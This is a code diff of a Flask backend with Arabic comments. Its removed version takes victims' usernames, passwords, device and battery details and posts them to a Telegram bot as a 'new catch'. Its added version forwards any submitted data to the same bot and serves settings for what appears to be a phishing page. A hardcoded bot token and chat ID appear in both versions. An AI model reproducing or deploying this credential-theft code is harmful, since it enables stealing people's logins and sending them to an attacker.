@@ -1,40 +1,28 @@
 from flask import Flask, request, jsonify
 import requests
-from datetime import datetime
 
 app = Flask(__name__)
 
-TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
+TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
 CHAT_ID = "7984067238"
+
+# تخزين مؤقت للإعدادات (في الذاكرة)
+latest_config = {"image": "", "letter": "", "button": ""}
 
 @app.route('/api/save', methods=['POST'])
 def save_data():
-    try:
-        data = request.json
-        u = data.get('user', 'غير معروف')
-        p = data.get('pass', 'غير معروف')
-        d = data.get('device', 'غير معروف')
-        b = data.get('battery', 'N/A')
-        t = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
+    global latest_config
+    data = request.json
+    latest_config = data # تحديث الإعدادات
+    
+    # إرسال للبوت
+    text = f"🚀 بيانات جديدة:\n{data}"
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": text})
+    return jsonify({"status": "success"})
 
-        # تنسيق النصوص المرتب بالكامل
-        msg = (
-            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
-            "━━━━━━━━━━━━━━━\n"
-            f"👤 **المستخدم:** `{u}`\n"
-            f"🔑 **كلمة السر:** `{p}`\n"
-            "━━━━━━━━━━━━━━━\n"
-            f"📱 **الجهاز:** {d}\n"
-            f"🔋 **البطارية:** {b}\n"
-            f"⏰ **الوقت:** {t}\n"
-            "━━━━━━━━━━━━━━━"
-        )
-
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-        return jsonify({"status": "success"}), 200
-    except:
-        return jsonify({"status": "error"}), 500
+@app.route('/api/get', methods=['GET'])
+def get_config():
+    return jsonify(latest_config)
 
 def handler(environ, start_response):
     return app(environ, start_response)
